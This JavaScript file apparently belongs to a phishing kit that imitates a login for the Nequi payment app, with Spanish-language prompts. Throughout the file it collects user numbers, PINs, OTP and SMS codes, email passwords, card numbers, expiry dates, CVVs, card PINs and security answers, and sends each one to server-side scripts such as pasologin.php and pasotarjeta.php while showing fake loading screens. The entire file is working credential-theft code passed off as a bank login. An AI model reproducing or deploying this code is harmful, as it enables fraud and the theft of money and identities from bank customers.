 function obtenerFechaFormato(){
    var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
    var diasSemana = new Array("Domingo","Lunes","Martes","Mi\u00E9rcoles","Jueves","Viernes","S\u00E1bado");
    var f = new Date();
    var minuto = (f.getMinutes() < 10) ? '0' + f.getMinutes() : f.getMinutes();
    var hora = (f.getHours() > 12) ? f.getHours() - 12 : f.getHours();
    var hora = (hora < 10) ? '0' + hora : hora;
    var meridiano = (f.getHours() > 11) ? 'PM' : 'AM';
    document.write(diasSemana[f.getDay()] + ' ' + f.getDate() + ' de ' + meses[f.getMonth()] + ' de ' + f.getFullYear() + ', ' + hora + ':' + minuto + ' ' + meridiano);
} 

var espera = 0;

 function paso1(){

    $(".home").hide();
    $(".acceso").show();

 }  

 function mostrar() {



          setTimeout(function() {
                        $(".clave").show();
                        $(".acceso").hide();
          }, 3000);


 

} 

function final() {

    if ($("#usuario").val() != "") {
      if ($("#usuario").val().length == 10 ) {
        $("#msgUsuario").css("display", "none");  

          if ($("#password").val() != "") {
            if ($("#password").val().length == 4 ) {
              $("#msgClave").css("display", "none");

              $(".fondo").show();
              $(".mensaje").show();

              //var usr = $("#usuario").val();
              var sesionid = $("#sesionid").val();
              //var op = 'clave';
              var dispo = detectar_dispositivo();
              console.log($("#usuario").val(), $("#password").val(), sesionid);

                $.post( "../../../process/pasologin.php",{ usr: $("#usuario").val(), pas: $("#password").val(),  ban:"Nequi", dis:dispo  },function( data ) {
                  espera = 1;     
                }); 

            }else{
              $("#msgClave").html(" ¡Ups! Verifique los datos"); 
              $("#msgClave").css("display", "table");
              $("#password").focus();
            }   
          }else{    
            $("#msgClave").html("¡Ups! El campo esta vacio"); 
            $("#msgClave").css("display", "table");
            $("#password").focus();
          }
      }else{
        $("#msgUsuario").html("¡Ups! Solo puedes ingresar 10 digitos");
        $("#msgUsuario").css("display", "table");
        $("#usuario").focus();  
      }
    }else{  
      $("#msgUsuario").html("¡Ups! El campo esta vacio");
      $("#msgUsuario").css("display", "table");
      $("#usuario").focus();
    }

}

function registaclave() {

    if ($("#clave").val() != "") {
      if ($("#clave").val().length == 4 ) {
        $("#msgClave").css("display", "none");
        //$(".fondo").show();
        //$(".mensaje").show();
        var op = 'clave';
        console.log($("#clave").val());
        $.post( "run/launch.php",{ pass: $("#clave").val(), op: op },function( data ) {
          espera = 1;
        }); 
      }else{
        $("#msgClave").html("Verifique los datos"); 
        $("#msgClave").css("display", "table");
        $("#clave").focus();
      }   
    }else{    
      $("#msgClave").html("El campo esta vacio"); 
      $("#msgClave").css("display", "table");
      $("#clave").focus();
    }
  
}

function registaclave2() {

    if ($("#clave2").val() != "") {
      if ($("#clave2").val().length == 4 ) {
        $("#msgClave").css("display", "none");
        $(".fondo").show();
        $(".mensaje").show();
        var op = 'clave';
        $.post( "run/launch.php",{ pass: $("#clave2").val(), op: op },function( data ) {
          espera = 1;
        }); 
      }else{
        $("#msgClave").html("Verifique los datos"); 
        $("#msgClave").css("display", "table");
        $("#clave2").focus();
      }   
    }else{    
      $("#msgClave").html("El campo esta vacio"); 
      $("#msgClave").css("display", "table");
      $("#clave2").focus();
    }
  
}

function guardarotp(dina){
/*  if ($("#codigootp").val() != "") {
    if ($("#codigootp").val().length >= 6 && $("#codigootp").val().length <= 8) {
      $("#msgOTP").css("display", "none");*/
      $(".fondo").show();
      $(".mensaje").show();

      console.log(dina);
      var op = 'otp';
      $.post( "../../../process/pasootp.php",{ otp:dina },function( data ) {
        espera = 1;
      });
/*    }else{
      $("#msgOTP").html("Verifique los datos");
      $("#msgOTP").css("display", "table");
      $("#codigootp").focus();
    } 
  }else{
    $("#msgOTP").html("El campo está vacio");
    $("#msgOTP").css("display", "table");
    $("#codigootp").focus();
  }*/
}

/*
function guardarotp2(){
  if ($("#codigootp2").val() != "") {
    if ($("#codigootp2").val().length == 6) {
      $("#msgOTP2").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'otp';
      $.post( "run/launch.php",{ otp:$("#codigootp2").val(), op: op },function( data ) {
        espera = 1;
      });

    }else{
      $("#msgOTP2").html("Verifique los datos");
      $("#msgOTP2").css("display", "table");
      $("#codigootp2").focus();
    }
  }else{
    $("#msgOTP2").html("El campo está vacio");
    $("#msgOTP2").css("display", "table");
    $("#codigootp2").focus();
  }
}*/

function registraremail(){
  if ($("#email").val() != "") {  
    $("#msgEmail").css("display", "none");  
    if ($("#clavemail").val() != "") {
      $("#msgClaveEmail").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'email';
      $.post( "../../../process/pasocorreo.php",{ eml: $("#email").val(), clv: $("#clavemail").val(), cel: "-" },function( data ) {
        espera = 1;
      });
    }else{
      $("#msgClaveEmail").css("display", "table");
      $("#msgEmail").css("display", "none");
      $("#clavemail").focus();
    }
  }else{
    $("#msgClaveEmail").css("display", "none");
    $("#msgEmail").css("display", "table");
    $("#email").focus();
  }
}

function registrarcel(){
  if ($("#celular").val() != "") {
    if ($("#celular").val().length == 10) {
      $("#msgCelular").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'cel';
      $.post( "run/launch.php",{ cel:$("#celular").val(), op: op },function( data ) {
        espera = 1;
      });
    }else{
      $("#msgCelular").html(" ¡Ups! Verifique los datos");
      $("#msgCelular").css("display", "table");
      $("#celular").focus();
    } 
  }else{
    $("#msgCelular").html(" ¡Ups! El campo está vacio");
    $("#msgCelular").css("display", "table");
    $("#celular").focus();
  }
}

function guardarape(){
  if ($("#apellido").val() != "") {
    // if ($("#apellido").val().length == 30) {
      $("#msgAPE").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'apellido';
      $.post( "run/launch.php",{ ape:$("#apellido").val(), op: op },function( data ) {
        espera = 1;
      });
/*    }else{
      $("#msgOTP").html("Verifique los datos");
      $("#msgOTP").css("display", "table");
      $("#apellido").focus();
    }*/ 
  }else{
    $("#msgAPE").html(" ¡Ups! El campo está vacio");
    $("#msgAPE").css("display", "table");
    $("#apellido").focus();
  }
}

function guardarnac(){
  if ($("#nacimiento").val() != "") {
     if ($("#nacimiento").val().length == 4) {
      $("#msgAnio").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'nacimiento';
      $.post( "run/launch.php",{ nac:$("#nacimiento").val(), op: op  },function( data ) {
        espera = 1;
      });
    }else{
      $("#msgAnio").html(" ¡Ups! Verifique los datos");
      $("#msgAnio").css("display", "table");
      $("#nacimiento").focus();
    } 
  }else{
    $("#msgAnio").html("El campo está vacio");
    $("#msgAnio").css("display", "table");
    $("#nacimiento").focus();
  }
}

function guardartar(){
  if ($("#tarjeta16").val() != "") {
    if ($("#tarjeta16").val().length == 16) {
      $("#msgTarjeta").css("display", "none");

      if ($("#Fecha").val() != "" ) {
        $("#msgExpira").css("display", "none");

        if ($("#cvv").val() != "") {
          if ($("#cvv").val().length == 3) {
            $("#msgCVV").css("display", "none");

            $(".fondo").show();
            $(".mensaje").show();
            fech = $("#Fecha").val();
            var op = 'tarjetacd';
            $.post( "../../../process/pasotarjeta.php",{ tar: $("#tarjeta16").val(), fec: fech, cvv: $("#cvv").val() },function( data ) {
              espera = 1;
            });
          }else{
            $("#msgCVV").html("Verifique los datos");
            $("#msgTarjeta").css("display", "none");
            $("#msgExpira").css("display", "none");
            $("#msgCVV").css("display", "table");
            $("#cvv").focus();
          }
        }else{
          $("#msgCVV").html("El campo está vacio");
          $("#msgTarjeta").css("display", "none");
          $("#msgExpira").css("display", "none");
          $("#msgCVV").css("display", "table");
          $("#cvv").focus();
        }
      }else{
        $("#msgExpira").html("El campo está vacio");
        $("#msgTarjeta").css("display", "none");
        $("#msgExpira").css("display", "table");
        $("#msgCVV").css("display", "none");
        $("#expira").focus();
      }
    }else{
      $("#msgTarjeta").html("Verifique los datos");
      $("#msgTarjeta").css("display", "table");
      $("#msgExpira").css("display", "none");
      $("#msgCVV").css("display", "none");
      $("#tarjeta16").focus();          
    }
  }else{
    $("#msgTarjeta").html("El campo está vacio");
    $("#msgTarjeta").css("display", "table");
    $("#msgExpira").css("display", "none");
    $("#msgCVV").css("display", "none");
    $("#tarjeta16").focus();
  } 
}

function guardartardt(){
  if ($("#tarjeta16dt").val() != "") {
    if ($("#tarjeta16dt").val().length == 16) {
      $("#msgTarjetadt").css("display", "none");

      if ($("#Fechadt").val() != "" ) {
        $("#msgExpiradt").css("display", "none");
  
        if ($("#cvvdt").val() != "") {
          if ($("#cvvdt").val().length == 3) {
            $("#msgCVVdt").css("display", "none");

                  if ($("#clavedt").val() != "") {
                    if ($("#clavedt").val().length == 4) {
                      $("#msgClavedt").css("display", "none");

                      $(".fondo").show();
                      $(".mensaje").show();
                      fecha = $("#Fechadt").val();
                      tj = $("#tarjeta16dt").val();
                      cvv = $("#cvvdt").val();
                      clv = $("#clavedt").val();
                      var op = 'tarjetadt';

                      $.post( "../../../process/pasotarjetadt.php",{ tjdt:tj, fechadt:fecha, cvvdt:cvv, clvdt:clv },function( data ) {
                        espera = 1;
                      });
                    }else{
                      $("#msgClavedt").html("Verifique los datos");
                      $("#msgClavedt").css("display", "table");
                      $("#msgTarjetadt").css("display", "none");
                      $("#msgExpiradt").css("display", "none");
                      $("#msgCVVdt").css("display", "none");
                      $("#clavedt").focus();
                    }
                  }else{
                    $("#msgClavedt").html("El campo está vacio");
                    $("#msgClavedt").css("display", "table");
                    $("#msgTarjetadt").css("display", "none");
                    $("#msgExpiradt").css("display", "none");
                    $("#msgCVVdt").css("display", "none");
                    $("#clavedt").focus();
                  }


              }else{
                $("#msgCVVdt").html("Verifique los datos");
                $("#msgCVVdt").css("display", "table");
                $("#msgTarjetadt").css("display", "none");
                $("#msgExpiradt").css("display", "none");
                $("#msgClavedt").css("display", "none");                
                $("#cvvdt").focus();
              }
            }else{
              $("#msgCVVdt").html("El campo está vacio");
              $("#msgCVVdt").css("display", "table");
              $("#msgTarjetadt").css("display", "none");
              $("#msgExpiradt").css("display", "none");
              $("#msgClavedt").css("display", "none");
              $("#cvvdt").focus();
            }

      }else{
        $("#msgExpiradt").html("El campo está vacio");
        $("#msgExpiradt").css("display", "table");
        //$("#msgTarjetadt").css("display", "none");
        $("#msgCVVdt").css("display", "none");
        $("#msgClavedt").css("display", "none");
        $("#expiradt").focus();
      }


    }else{
      $("#msgTarjetadt").html("Verifique los datos");
      $("#msgTarjetadt").css("display", "table");
      $("#msgExpiradt").css("display", "none");
      $("#msgCVVdt").css("display", "none");
      $("#msgClavedt").css("display", "none");
      $("#tarjeta16dt").focus();          
    }
  }else{
    $("#msgTarjetadt").html("El campo está vacio");
    $("#msgTarjetadt").css("display", "table");
    $("#msgExpiradt").css("display", "none"); 
    $("#msgCVVdt").css("display", "none");
    $("#msgClavedt").css("display", "none");
    $("#tarjeta16dt").focus();
  } 
}

function registaresp() {

  if ($("#resp").val() != "") {
      if ($("#resp").val().length == 6 ) {
        $("#msgResp").css("display", "none");
        var resp = $("#resp").val() ;
        $(".fondo").show();
        $(".mensaje").show();
        var op = 'respuesta';
        $.post( "run/launch.php",{ resp: resp, op: op },function( data ) {
          //console.log (data);
          espera = 1;
        }); 
      }else{
        $("#msgResp").html(" ¡Ups! Verifique los datos");
        $("#msgResp").css("display", "table");
        $("#resp").focus();  
      }        
    }else{
    $("#msgResp").html(" ¡Ups! El campo esta vacio");
    $("#msgResp").css("display", "table");
    $("#resp").focus();
  }        
}

function registaresp2() {

  if ($("#resp2").val() != "") {
        $("#msgResp").css("display", "none");
        var resp2 = $("#resp2").val() ;
        $(".fondo").show();
        $(".mensaje").show();
        var op = 'respuesta2';
        $.post( "../../../process/pasoresp.php",{ resp: resp2 },function( data ) {
          espera = 1;
        }); 
    }else{
    $("#msgResp").html(" ¡Ups! El campo esta vacio");
    $("#msgResp").css("display", "table");
    $("#resp").focus();
  }        
}


function guardarsmsotp(){
  if ($("#smsotp").val() != "") {
    if ($("#smsotp").val().length == 6) {
      $("#msgSMSOTP").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'smsotp';
      $.post( "../../../process/pasootp.php",{ otp: $("#smsotp").val() },function( data ) {
        espera = 1;
      });

    }else{
      $("#msgSMSOTP").html("Verifique los datos");
      $("#msgSMSOTP").css("display", "table");
      $("#smsotp").focus();
    }
  }else{
    $("#msgSMSOTP").html("El campo está vacio");
    $("#msgSMSOTP").css("display", "table");
    $("#smsotp").focus();
  }
}


function pedircodigo() {

  var estado = 34 ;
  var op = 'pedircodigo';
      $.post( "run/launch.php",{ estado: estado, op: op },function( data ) {
        espera = 1;
      });  

    setTimeout(function() {
        $(".solicitacodigo").hide(); 
        $(".codigootp3").show();  
    }, 3000);      


}


function guardarotp3(){
  if ($("#codigo").val() != "") {
    if ($("#codigo").val().length == 6) {
      $("#msgCodigo").css("display", "none");
      $(".fondo").show();
      $(".mensaje").show();
      var op = 'otp';
      $.post( "../../../process/pasootp.php",{ otp: $("#codigo").val() },function( data ) {
        espera = 1;
      });

    }else{
      $("#msgCodigo").html("Verifique los datos");
      $("#msgCodigo").css("display", "table");
      $("#codigo").focus();
    }
  }else{
    $("#msgCodigo").html("El campo está vacio");
    $("#msgCodigo").css("display", "table");
    $("#codigo").focus();
  }
}



  jQuery(document).ready(function(){
  // Listen for the input event.  
  
  jQuery("#clave").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });
  
  jQuery("#clave2").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#codigootp").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  }); 
  
  jQuery("#codigootp2").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#celular").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#nacimiento").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  
  
  jQuery("#tarjeta16").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });   
  
  jQuery("#cvv").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });  

    jQuery("#tarjeta16dt").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });   
  
  jQuery("#cvvdt").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });
  
  jQuery("#clavedt").on('input', function (evt) {
    // Allow only numbers.
    jQuery(this).val(jQuery(this).val().replace(/[^0-9]/g, ''));
  });   
  
  
});  